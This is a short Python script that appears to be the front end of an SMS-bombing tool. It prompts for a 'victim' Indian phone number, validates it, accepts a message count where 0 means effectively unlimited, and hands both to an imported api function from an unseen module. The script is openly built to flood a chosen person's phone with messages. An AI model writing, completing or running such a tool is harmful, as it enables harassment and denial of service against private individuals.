import re
from _ import api
def main()->None:
	target:str=str(input("Enter victim ph.no(Ex:+919876543210):"))

	pattern = re.compile(r'^\+91\d{10}$')

	if pattern.match(target):
		print(target)
	else:
		print("Please enter correct number")
		return

	max:int=10**500
	msg_count:int=int(input("Enter msg count(enter 0 for unlimited sms):"))
	if msg_count==0:
		msg_count=max
	else:
		msg_count=msg_count
	api(target,msg_count)
if __name__ == '__main__':
	main()
		